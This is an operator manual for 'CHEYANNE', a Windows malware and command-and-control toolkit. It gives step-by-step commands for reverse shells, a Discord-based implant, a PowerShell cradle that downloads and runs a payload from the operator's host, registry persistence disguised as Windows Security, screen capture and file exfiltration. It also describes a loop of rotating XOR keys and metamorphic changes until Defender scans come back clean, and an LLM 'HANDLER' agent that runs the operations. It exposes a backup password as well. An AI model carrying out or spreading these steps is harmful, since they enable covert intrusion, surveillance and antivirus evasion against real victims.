**Operator side:**
```cmd
python shell\vader_listener.py 4443
```

**Generate XOR config for target IP/port:**
```cmd
python shell\vader_listener.py 4443 --gen
```
Outputs XOR-encoded byte arrays for the IP and port. Paste into `vader_shell_annotated.c`, recompile.

**Target side:**
```cmd
shell\vader_shell.exe
:: Or deploy via stager/vector
```

### Agent C2 (vader_ui + vader_agent)

**Operator side:**
```cmd
python vader_ui.py
:: Dashboard at http://127.0.0.1:8666
:: Agent listener on TCP :8667
```

**Target side:**
```cmd
python vader_agent.py <operator_ip>
python vader_agent.py <operator_ip> --reconnect
```

### Stager HTTP Server

```cmd
python stagers\vader_serve.py
:: Serves files from downloads/ directory on :8080
```

Place payloads in `downloads/`. Stager on target fetches via WinHTTP.

### Dropper Callback

```cmd
python cloak\c2_listen.py
:: Listens on :53683 for dropper check-ins
```

---

## 9. Testing Checklist

### Tier 1 — Build Verification

```
[ ] cl.exe compiles a trivial hello.c                 → verify toolchain
[ ] ml64.exe assembles gate_stub.asm                  → verify MASM
[ ] python deploy.py --compile                        → all components build (X/Y OK)
[ ] python cloak/build_cloak.py                       → cloak.dll + loader + dropper
[ ] python byovd/build_byovd.py                       → byovd.exe + vader_persist.exe
```

### Tier 2 — Detection Verification

```
[ ] python deploy.py --status                         → all binaries CLEAN
[ ] python tests/scan_all.py                          → full scan, zero detections
[ ] python mutate.py --status                         → all XOR keys present, all BUILT
```

### Tier 3 — Functional Verification

```
[ ] dark_room\dark_room.exe --test                    → "AMSI: BLIND" + "ETW: BLIND"
[ ] vader_listener.py 4443 + vader_shell.exe          → shell connects, cmd works
[ ] vader_inject.exe + vader_inject.dll               → DLL injected into target PID
[ ] V7 phantom DLL planted + Office task triggered    → canary at C:\Windows\Temp\osp_telemetry.log
[ ] cloak_loader.exe                                  → processes hidden from Task Manager
[ ] vader_agent.py 127.0.0.1 + vader_ui.py            → agent registers in dashboard
```

### Tier 4 — Pipeline Verification

```
[ ] python mutate.py --dry-run                        → shows key rotation plan
[ ] python mutate.py                                  → keys rotate, recompile, rescan CLEAN
[ ] python metamorph.py --dry-run                     → shows transform plan
[ ] python vader_evolve.py --dry-run                  → full pipeline preview
[ ] python deploy.py --pentest --dry-run              → pentest plan displayed
```

### Tier 5 — Menu/UI Verification

```
[ ] python vader_menu.py                              → dashboard renders, all keys visible
[ ] vader_menu.py option 1 (Compile)                  → compiles all
[ ] vader_menu.py option 2 (Scan)                     → scans all
[ ] vader_menu.py option W (Web)                      → browser opens :8666
[ ] vader_menu.py option A (Agent)                    → agent connects locally
```

---

## 10. Defender Scan Verification

### Quick Scan (deploy.py)

```cmd
python deploy.py --status
```

Uses `scan_all.py` under the hood. Walks all .exe/.dll/.obj files, copies each to temp, scans with `MpCmdRun.exe -Scan -ScanType 3 -File <path> -DisableRemediation`.

### Individual Scan

```cmd
:: Find your MpCmdRun.exe
dir "C:\ProgramData\Microsoft\Windows Defender\Platform\*\MpCmdRun.exe"

:: Scan a single file
MpCmdRun.exe -Scan -ScanType 3 -File "C:\path\to\binary.exe" -DisableRemediation
```

**Return codes:**
- `0` = CLEAN (no threats found)
- `2` = DETECTED (threat found)

### If Detection Occurs

1. **Rotate XOR key:** `python mutate.py --target <component>`
   - Tries up to 10 random keys, recompiles and rescans each time
   - If one passes, that's your new key

2. **Run metamorphic engine:** `python metamorph.py --target <component> --intensity high`
   - Changes structural identity (dead code, junk vars, opaque predicates)
   - Then run mutate.py again

3. **Full evolution:** `python vader_evolve.py --target <component> --intensity high`
   - Chains metamorph + mutate + compile + scan in one command

4. **Manual investigation:**
   - Check which strings Defender is hitting: `python reporting\pentest_report.py` or `strings binary.exe | sort -u`
   - Consider adding more junk API calls or splitting the binary into stages

### Scan All at Once

```cmd
python tests\scan_all.py
```

Expected output for a clean build:
```
  dark_room.exe:          CLEAN
  vader_shell.exe:        CLEAN
  vader_inject.exe:       CLEAN
  vader_inject.dll:       CLEAN
  WsNativePushService.exe: CLEAN
  VERSION.dll:            CLEAN
  targetname.dll:         CLEAN
  osppc.dll:              CLEAN
  vader_stager.exe:       CLEAN
  vader_implant.exe:      CLEAN
  vader_clean.exe:        CLEAN
  cloak.dll:              CLEAN
  cloak_loader.exe:       CLEAN
  vader_dropper.exe:      CLEAN
  byovd.exe:              CLEAN
  vader_persist.exe:      CLEAN
```

### XOR Key Encoding Reference

To manually encode a new string for any component:

```python
key = 0x41  # Replace with target component's key
s = "your_string"
encoded = ', '.join(f'0x{b^key:02X}' for b in s.encode())
print(f"static const unsigned char x[] = {{{encoded}}};")
print(f"#define x_LEN {len(s)}")
```

To decode/verify an existing encoded array:

```python
key = 0x77
arr = [0x04, 0x16, 0x10, 0x1A]  # paste hex values
print(''.join(chr(b ^ key) for b in arr))
```

---

## Appendix A: Compiler Flags Reference

| Flag | Purpose |
|------|---------|
| `/O1` | Minimize size (smaller binary = less signature surface) |
| `/O2` | Maximize speed (used for cloak/BYOVD) |
| `/GS-` | Disable stack buffer security checks (smaller, no __security_cookie) |
| `/LD` | Build as DLL |
| `/utf-8` | Source and execution charset UTF-8 |
| `/Fe:<name>` | Output filename |
| `/W3` | Warning level 3 (used for cloak/BYOVD) |
| `/nologo` | Suppress compiler banner |
| `/SUBSYSTEM:WINDOWS` | No console window (dropper) |
| `/DEF:<file>.def` | Module definition file (DLL exports) |

Common link libraries:
- `advapi32.lib` — Registry, service control, token manipulation
- `user32.lib` — Window messages, SetWindowsHookEx
- `ws2_32.lib` — Winsock (TCP connections)
- `winhttp.lib` — WinHTTP (HTTP stager)
- `kernel32.lib` — Base Win32 API
- `ntdll.lib` — Native API (NtQuerySystemInformation, etc.)
- `iphlpapi.lib` — IP Helper (GetTcpTable, GetUdpTable)
- `psapi.lib` — Process status API (BYOVD)
- `shlwapi.lib` — Shell utility API (BYOVD persist)

---

## Appendix B: Troubleshooting

### "vcvars64.bat not found"

`cheyanne_config.py` auto-detects Visual Studio. If it still fails, your VS install is non-standard. Find the real path:
```cmd
dir "C:\Program Files\Microsoft Visual Studio\*\*\VC\Auxiliary\Build\vcvars64.bat" /s
```
Then edit the fallback in `cheyanne_config.py` line 22.

### "MpCmdRun.exe not found"

Defender platform not installed at expected path. Check:
```cmd
dir "C:\ProgramData\Microsoft\Windows Defender\Platform\*\MpCmdRun.exe"
```
If absent, install/enable Windows Security.

### "Binary locked by Defender"

Defender has quarantined or is actively scanning the binary. The build scripts handle this by compiling to a temp directory and then replacing. If the .new file appears:
```cmd
:: Kill Defender's file lock by excluding the build dir
:: OR just wait and retry
copy /Y binary.exe.new binary.exe
```

### Compile fails with "unresolved external symbol"

Missing a link library. Cross-reference the component's `link_libs` in deploy.py or the manual compile command in Section 4.

### gate_stub.obj missing or outdated

Reassemble:
```cmd
"%VCVARS%" && cd /d injection && ml64.exe /c gate_stub.asm /Fo:gate_stub.obj
```

### Agent won't connect

1. Firewall: ensure TCP 8667 is open between operator and target
2. Verify dashboard is running: `python vader_ui.py`
3. Check agent is pointing at correct IP: `python vader_agent.py <operator_ip>`
4. Check for port conflicts: `netstat -ano | findstr 8667`

### Canary file not appearing

1. Vector binary wasn't loaded — check deploy location
2. For V7: Office not installed, or update task doesn't exist
3. For V4: Service hasn't restarted yet
4. Check Defender didn't quarantine the planted binary
5. Run `python deploy.py --canary V7` to poll

### Web dashboard blank/errors

1. Port 8666 already in use: `netstat -ano | findstr 8666`
2. Try different port: `python vader_ui.py 9000`
3. Check Python version: must be 3.10+ for some stdlib features

### Discord deploy doesn't work — "No response within 30s"

**This is the bootstrap problem.** The Discord implant on the target is an old build that beacons (heartbeats appear) but doesn't poll for commands. It's deaf — sends but never listens.

**Why it happens:** The first time you deploy to a target, the implant doesn't have the bidirectional command-polling loop. You can only fix this via TCP.

**Recovery procedure:**
1. **Reboot the target** — if `persist` was run previously, the registry Run keys auto-start `vader_shell.exe` on boot. It has C2 IP baked in and will call back to :4443 automatically.
2. Wait for TCP session to appear: `[+] SHELL: <id> connected from <ip>`
3. Once TCP is up: `deploy` — this pushes the NEW `svchost_update.exe` (with command polling) to the target, replacing the deaf one.
4. After deploy: `persist` — updates registry to point to the new binaries.
5. From now on, Discord is bidirectional. You can deploy via Discord in the future.

**If no persist was set (fresh target):** You need physical or remote access to run the binary manually:
```
:: On target machine:
C:\Users\Public\vader_shell.exe
```
Or trigger via network share / RDP / any execution vector you have.

**Rule:** First deploy to any new target MUST be via TCP or physical access. Discord bidirectional only works after the new implant is deployed at least once.

### Interactive shell returns echo only (no output)

After running `watch`, the PowerShell loop on the target keeps running even after Ctrl+C. It consumes cmd.exe's stdin — all commands echo but don't execute.

**Fix:** The latest C2 code auto-kills PowerShell on watch exit. If you hit this on an older version:
```
:: At the interact prompt:
taskkill /F /IM powershell.exe
```
Then commands work again. Or: `back` → `deploy` → interact the new session.

---

```
22DIV / george wu
CHEYANNE — Build from Ashes
"The hunt never ends."
```

---

## 11. CHEYANNE — Discord C2 Infrastructure

### Prerequisites (additional)

| # | Tool | Why |
|---|------|-----|
| 1 | **PyInstaller** | Compile Python implant to standalone .exe |
| 2 | **Discord Bot** | Create bot at discord.com/developers, get Bot Token |
| 3 | **Discord Webhook** | Create webhook in your C2 channel |
| 4 | **Ollama** (optional) | Local LLM for HANDLER agent |

```cmd
pip install pyinstaller
:: Ollama: https://ollama.ai — pull any model:
ollama pull mistral-nemo
```

### Discord Setup

1. Create a Discord server (private)
2. Create a `#c2` text channel
3. **Webhook:** Channel Settings → Integrations → Webhooks → New → Copy URL
4. **Bot:** discord.com/developers → New App → Bot → Copy Token → Enable MESSAGE CONTENT intent
5. **Invite bot** to your server with Read/Send Messages permission
6. **Get Channel ID:** Enable Developer Mode → Right-click #c2 → Copy Channel ID

### Configure Implant

Edit `agent/discord_implant.py` lines 1-5:
```python
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR/WEBHOOK"
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHANNEL_ID = "YOUR_CHANNEL_ID"
C2_HOST = "YOUR_IP"     # for TCP reverse shell
C2_PORT = 4443
```

### Build Discord Implant

```cmd
:: From cheyanne root:
cd agent
pyinstaller --onefile --noconsole discord_implant.py
:: Output: agent/dist_py/svchost_update.exe (~9.4MB)
```

Or via menu: `python vader_menu.py` → `[B]`

### Deploy to Target

**Option 1 — Auto Deploy (menu [A]):**
Compiles, serves HTTP, waits for reverse shell, pushes implant, takes screenshot. All automated.

**Option 2 — Manual via TCP shell:**
```cmd
:: On operator: start C2 shell
python vader_menu.py → [D]

:: On target shell (chey> prompt):
powershell -c "Invoke-WebRequest -Uri 'http://OPERATOR_IP:8890/svchost_update.exe' -OutFile 'C:\Users\Public\svchost_update.exe'; Start-Process 'C:\Users\Public\svchost_update.exe'"
```

**Option 3 — USB/physical access:**
Copy `svchost_update.exe` to target, execute.

### Operate via Discord

After implant is running, use Phase 4 menu or HANDLER:

```cmd
:: Menu
python vader_menu.py
[S]  → list sessions
[T]  → screenshot
[L]  → browse files
[E]  → exfil file
[N]  → recon

:: HANDLER (AI operator)
python vader_menu.py → [H]
"take a screenshot"
"list files on the desktop"
"what's running on the target"
"pull that file"
```

### Backup Procedure

The encrypted 7z backup contains the entire project including source, docs, evidence, and compiled binaries.

```cmd
:: Create encrypted backup with header encryption
7z a -p668340 -mhe=on "cheyanne-FULL-YYYYMMDD.7z" "C:\Users\gwu07\Desktop\cheyanne\*" -xr!.git -xr!__pycache__ -xr!*.pyc -xr!build -xr!dist

:: Backup locations:
:: Desktop: C:\Users\gwu07\Desktop\cheyanne-FULL-YYYYMMDD.7z
:: Hidden:  C:\Users\gwu07\.cheyanne\cheyanne-FULL-YYYYMMDD.7z
```

**Archive password: `668340`** — encrypted headers (filenames hidden).

---

## 12. HANDLER — AI-Powered C2 Operator

### Standalone Launch

```cmd
:: Default (Ollama backend — local, free, slow)
python cheyanne_agent.py

:: Kimi K2.5 backend (OpenRouter — fast cloud API, ~$0.001/query)
python cheyanne_agent.py --kimi

:: Claude API backend (best quality, requires API key)
set ANTHROPIC_API_KEY=sk-ant-...
python cheyanne_agent.py --claude
```

### Backend Details

**Ollama** — Any model works. Prompt-based tool calling (not native tool API). Auto-detects by trying 127.0.0.1, LAN IP, localhost.

**Kimi K2.5** — Uses OpenRouter API. Reads `OPENROUTER_API_KEY` from env or `%LOCALAPPDATA%\hermes\.env`. Kimi K2.5 is a reasoning model — content and reasoning tokens are separate. Note: direct Kimi API (`api.kimi.com/coding/v1`) is locked to whitelisted agents (Kimi CLI, Claude Code etc) — OpenRouter is the only path for custom code.

**Claude** — Uses Anthropic API. Requires `ANTHROPIC_API_KEY` env var. Best tool compliance.

### Tested Models (Ollama)

- `mistral-nemo` (abliterated) — works, slower tool parsing
- `llama3.1:8b` — good tool compliance
- `qwen2.5-coder` — fast, good at structured output

### Adding New Tools

Edit `cheyanne_agent.py`:
1. Add tool to `TOOLS_SCHEMA` list (name + description + parameters)
2. Add case to `exec_tool()` function
3. Tool auto-appears in HANDLER's capabilities

### Tool Execution Flow

```
User input → LLM generates response with <tool> blocks
  → regex parser extracts tool calls
  → exec_tool() dispatches to cheyanne_ops functions
  → results fed back to LLM as "Tool results:" message
  → LLM analyzes results, may call more tools (up to 3 rounds)
  → Final text response displayed to operator
```

---

## 13. C2 Shortcuts + Live Watch

### TCP C2 v2 — `shell/vader_c2_v2.py`

Second-generation C2 with six shortcut commands, HTTP POST-back screenshot/watch, dual-payload deploy, and `--tcp-cmd` for non-interactive web UI dispatch.

### TCP C2 Shortcuts (chey> prompt)

All shortcuts auto-find the first live TCP session. No `interact` needed. Dispatch via `handle_tcp_command(session, cmd)` — splits on whitespace, matches against `TCP_SHORTCUTS` dict, calls handler with `(session, *args)`.

```
chey> deploy               Dual payload: kill old → download Discord implant + TCP shell → launch both
chey> screenshot           One-shot screen capture → HTTP POST back to :8891 → save + open
chey> watch                Live screen stream — single while-loop on target, frames to :8891, viewer on :8892
chey> watch 3              3-second refresh interval
chey> kill svchost_update.exe   taskkill on target
chey> recon                Full target enumeration (hostname, IP, user, Defender, etc.)
chey> persist              Dual registry Run keys — WindowsSecurityHealth + WindowsSecurityUpdate
```

### Deploy — Dual Payload, Zero Arguments

`cmd_deploy(session, *args)` pushes two payloads simultaneously:

| Payload | Binary | C2 Channel |
|---------|--------|------------|
| Discord implant | `svchost_update.exe` (PyInstaller) | Discord webhook + bot token |
| TCP reverse shell | `vader_shell.exe` (compiled C) | TCP :4443 |

C2 IP is auto-detected via UDP trick (`connect("8.8.8.8", 80)` → `getsockname()`). **XOR-baked** into the C shell at compile time (key rotated by `mutate.py` each build — check `XOR_KEY` in `vader_shell_annotated.c`). Operator types `deploy` with zero args. HTTP server on `:8890` serves both payloads. PowerShell download cradle sent to target to fetch and execute.

### Live Watch — How It Works

Three components in concert:

**1. Target-side (single PowerShell while-loop):**
One command sends a `while($true)` loop to the target. Each iteration: capture screen via `System.Drawing` / `CopyFromScreen`, save to `C:\Users\Public\screen.png` (delete old file first to prevent stale handles), read back with `[System.IO.File]::ReadAllBytes()`, HTTP POST raw bytes to `http://<C2_IP>:8891/screen.png`, sleep N seconds, repeat. Runs until process is killed.

**2. Receiver (port 8891):**
`start_watch_receiver()` — HTTP server accepting POSTs. Deletes old frame file before writing new one (cache-bust). Saves to `screenshots/watch_latest.jpg`.

**3. Viewer (port 8892):**
`start_watch_viewer()` — HTTP-served auto-refresh page. Uses **fetch + blob URL** pattern for Safari compatibility (Safari aggressively caches `<img src="...">` sources):

```javascript
setInterval(async () => {
    const resp = await fetch('/frame?' + Date.now());
    const blob = await resp.blob();
    const url = URL.createObjectURL(blob);
    document.getElementById('frame').src = url;
}, 2000);
```

Viewer is served over HTTP (not `file://`) because `file://` broke auto-refresh in most browsers. Ctrl+C stops the watch loop and reports frame count.

### Screenshot Auto-Pull

`cmd_screenshot(session, *args)` — one-shot variant of watch:

1. `start_screenshot_receiver()` spins up a one-shot HTTP receiver on `:8891`
2. PowerShell GDI screenshot command sent to target (`System.Drawing`)
3. Target POSTs raw PNG bytes to `http://<C2_IP>:8891/screenshot`
4. Receiver saves to `screenshots/screenshot_<timestamp>.png`
5. `os.startfile()` opens the image in default viewer automatically
6. Receiver shuts down after one capture

### Persist — Dual Registry Keys

`cmd_persist(session, *args)` sets two `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` values:

| Registry Value Name | Payload Path | Mimics |
|---------------------|-------------|--------|
| `WindowsSecurityHealth` | `C:\Users\Public\svchost_update.exe` | Windows Security |
| `WindowsSecurityUpdate` | `C:\Users\Public\vader_shell.exe` | Windows Update |

Both payloads deployed to `C:\Users\Public\` by the `deploy` command. `persist` sets both registry Run keys. No arguments needed for vader_shell.exe — C2 IP is XOR-baked at compile time.

**WARNING:** Run `deploy` before `persist`. The persist command assumes vader_shell.exe has the C2 IP baked in via Fresh Build. If the binary on target is an old generic build, it won't auto-connect on reboot.

### Non-Interactive Mode — `--tcp-cmd`

```cmd
python vader_c2_v2.py --tcp-cmd "deploy"
python vader_c2_v2.py --tcp-cmd "screenshot"
python vader_c2_v2.py --tcp-cmd "persist"
```

Connects to listener, selects active session, calls `handle_tcp_command()`, exits. No interactive prompt. This is how the web dashboard (`vader_ui.py`) dispatches C2 commands — spawns the process, captures stdout/stderr, returns JSON to the browser.

### HANDLER Backend — Kimi K2.5 via OpenRouter

`cheyanne_agent.py` now supports Kimi K2.5 as a third backend alongside Ollama and Claude:

```cmd
python cheyanne_agent.py --kimi     # Kimi K2.5 via OpenRouter (fast, ~$0.001/query)
python cheyanne_agent.py            # Default: Ollama (local, free, slower)
python cheyanne_agent.py --claude   # Claude API (best quality, needs ANTHROPIC_API_KEY)
```

Model: `moonshotai/kimi-k2.5` via `https://openrouter.ai/api/v1/chat/completions`. Direct Kimi API (`api.kimi.com/coding/v1`) is agent-locked to whitelisted clients — OpenRouter is the only path for custom code. API key: `OPENROUTER_API_KEY` from env or `%LOCALAPPDATA%\hermes\.env`. Kimi is a reasoning model — `reasoning_content` and `content` tokens returned separately, handled by `handle_reasoning_response()`.

### Web Dashboard — Mobile Responsive + Full Terminal Parity

`vader_ui.py` on `:8666` — all 4 phases and all TCP shortcuts accessible from any device:

- **Phase 1 — Build:** Compile, scan, mutate, key status
- **Phase 2 — Stealth:** Dark room, cloak build/test/activate
- **Phase 3 — Deploy:** C2 shell, build implant, auto deploy
- **Phase 4 — Operate:** Sessions, screenshot, browse, exfil, upload, recon + all TCP shortcuts

TCP shortcuts dispatched via POST to `/tcp` which spawns `vader_c2_v2.py --tcp-cmd` as subprocess.

**Mobile responsive:** viewport meta tag, CSS media queries at `768px` and `480px` breakpoints, flexbox `flex-wrap`, 44px minimum tap targets, collapsible sidebar, horizontal scroll for terminal output.

### Firewall Setup — `setup_firewall.bat`

Permanent Windows Firewall inbound rules for all 6 CHEYANNE ports. Requires admin. Idempotent — cleans old rules before adding.

| Port | Rule Name | Component |
|------|-----------|-----------|
| 4443 | CHEYANNE-C2 | TCP C2 listener |
| 8666 | CHEYANNE-UI | Web dashboard |
| 8667 | CHEYANNE-AGENT | Binary agent protocol |
| 8890 | CHEYANNE-SERVE | HTTP payload server |
| 8891 | CHEYANNE-RECV | Screenshot/Watch receiver |
| 8892 | CHEYANNE-WATCH | Watch live viewer |

Run once on a fresh operator machine:
```cmd
:: Requires admin elevation
setup_firewall.bat
```

### Port Conflict Handler

`cheyanne_ops.py` provides automatic port conflict resolution:
- `port_check(port)` — returns `(in_use, pid, process_name)`
- `port_force(port)` — kills the process silently
- `port_ensure(port)` — interactive menu: `[K]ill / [S]kip / [Q]uit`

Menu items `[D]` and `[W]` auto-run `port_ensure()` before launching.

### Menu Typed Commands

The `CHEYANNE >` menu accepts both key letters and typed words:
- `deploy` or `D` → opens C2 shell
- `shell` or `c2` or `D` → opens C2 shell
- `screenshot`, `watch`, `kill`, `recon`, `persist` → TCP shortcuts
- Any unknown command shows error (no silent ignore)

## 14. Bidirectional Discord C2

### The Problem

Discord sessions were "beacon-only" — implant posts recon/heartbeat to webhook, operator can't send commands back. TCP shell gives full interactive access but is LAN-only (`inet_addr()` = IP addresses only, no DNS).

### The Solution

The implant (`agent/discord_implant.py`) **already had command polling** (lines 318-341). It polls the channel every 5 seconds for `{"type": "cmd", "session": "<id>", "command": "<cmd>"}` messages, executes them, posts output back as `{"type": "output", ...}`.

The operator side (`shell/vader_c2_v2.py`) was blocking it with a hardcoded "beacon-only" message. Fixed by adding:

| Method | Purpose |
|--------|---------|
| `send_discord_cmd(session_id, command)` | POST JSON command to channel via bot token |
| `poll_discord_output(session_id, timeout)` | Poll channel for output messages from implant |
| `_discord_interact(session)` | Full interactive loop (like `_tcp_interact` but via Discord API) |
| `find_session(sid_prefix)` | Unified finder — prefers TCP, falls back to Discord |
| `send_to_session(session, cmd)` | Routes through TCP socket or Discord API automatically |

### How It Works

```
OPERATOR                    DISCORD                     TARGET
   |                           |                           |
   |-- send_discord_cmd() ---> |                           |
   |   POST {"type":"cmd",...} |                           |
   |                           |--- implant polls -------> |
   |                           |   get_messages(limit=5)   |
   |                           |                           |-- execute cmd
   |                           |<-- post_json(output) -----|
   |                           |   {"type":"output",...}    |
   |<-- poll_discord_output()  |                           |
   |   read channel for output |                           |
```

### Latency

- Implant polls every 5 seconds (`POLL_INTERVAL`)
- Operator polls every 2 seconds for responses
- Total round-trip: **5-15 seconds** per command
- Heartbeat: every 60 seconds

### What Works Over Discord

All shortcuts (deploy, screenshot, kill, recon, persist) now auto-route through Discord when no TCP session is available. `find_session()` prefers TCP (instant) but falls back to Discord (5-15s latency).

**Exception:** `watch` (live screen stream) requires TCP — continuous frame streaming can't route through Discord's rate-limited API.

### Persist Safety Check

`persist` warns if `deploy` hasn't been run in the current session — the registry key assumes vader_shell.exe has C2 IP baked in via Fresh Build. An old binary without baked IP won't auto-connect on reboot.

### Correct Deploy → Persist Flow

```
1. Fresh Build          compile with baked IP (XOR-encoded)
2. deploy               push fresh binary to target
3. persist              set registry keys (no args, binary has IP)
4. Reboot               exe auto-runs → decodes IP → connects
```
